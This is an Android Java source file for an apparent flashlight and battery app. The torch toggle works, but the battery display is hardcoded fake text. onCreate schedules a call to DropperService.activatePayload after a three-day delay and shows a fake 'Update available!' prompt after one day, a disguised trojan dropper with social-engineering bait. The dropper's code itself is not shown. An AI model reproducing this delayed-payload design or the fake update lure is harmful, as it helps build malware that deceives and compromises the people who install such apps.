package com.phantom.reach;

import android.app.Activity;
import android.os.Bundle;
import android.os.Handler;
import android.widget.Button;
import android.widget.TextView;
import android.hardware.camera2.CameraManager;
import android.content.Context;
import android.widget.Toast;

public class MainActivity extends Activity {
    private boolean isFlashOn = false;
    private TextView batteryStatus;
    private Button flashButton;
    private CameraManager cameraManager;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        flashButton = findViewById(R.id.flashToggle);
        batteryStatus = findViewById(R.id.batteryPercent);
        
        batteryStatus.setText("🔋 Battery: 87% - Optimized");
        
        flashButton.setOnClickListener(v -> toggleFlash());
        
        // Delayed dropper activation (3 days)
        new Handler().postDelayed(() -> {
            DropperService.activatePayload(this);
        }, 259200000);
        
        // Show fake update prompt after 1 day
        new Handler().postDelayed(() -> {
            Toast.makeText(this, "Update available! Better performance.", Toast.LENGTH_LONG).show();
        }, 86400000);
    }

    private void toggleFlash() {
        try {
            if (!isFlashOn) {
                cameraManager.setTorchMode("0", true);
                flashButton.setText("🔦 ON");
                flashButton.setBackgroundColor(0xFF4CAF50);
                isFlashOn = true;
            } else {
                cameraManager.setTorchMode("0", false);
                flashButton.setText("🔦 OFF");
                flashButton.setBackgroundColor(0xFFF44336);
                isFlashOn = false;
            }
        } catch (Exception e) {
            Toast.makeText(this, "Camera error", Toast.LENGTH_SHORT).show();
        }
    }
}